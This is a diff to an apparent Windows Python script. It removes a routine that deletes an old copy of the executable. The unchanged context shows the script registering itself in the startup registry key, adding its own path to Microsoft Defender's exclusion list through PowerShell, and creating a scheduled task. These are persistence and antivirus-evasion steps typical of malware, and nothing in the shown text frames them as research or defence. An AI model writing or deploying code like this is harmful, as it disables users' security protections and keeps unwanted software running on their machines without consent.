@@ -34,22 +34,6 @@ def add_to_startup(file_path):
     reg.CloseKey(open_key)
     print(f"Added {file_path} to startup")
 
-def remove_old_exe(file_path):
-    retries = 3
-    for i in range(retries):
-        try:
-            if os.path.exists(file_path):
-                os.remove(file_path)
-                print(f"Removed old executable: {file_path}")
-            else:
-                print(f"No old executable found at: {file_path}")
-            break
-        except PermissionError as e:
-            print(f"Attempt {i+1} to remove old executable failed: {e}")
-            time.sleep(1)
-    else:
-        print(f"Failed to remove old executable after {retries} attempts")
-
 def add_defender_exclusion(file_path):
     ps_script = f"""
     Add-MpPreference -ExclusionPath '{file_path}'
@@ -79,7 +63,6 @@ if __name__ == "__main__":
     time.sleep(2)
 
     exe_path = os.path.abspath(sys.argv[0])
-    remove_old_exe(exe_path)
     add_to_startup(exe_path)
     add_defender_exclusion(exe_path)
     create_scheduled_task(exe_path)
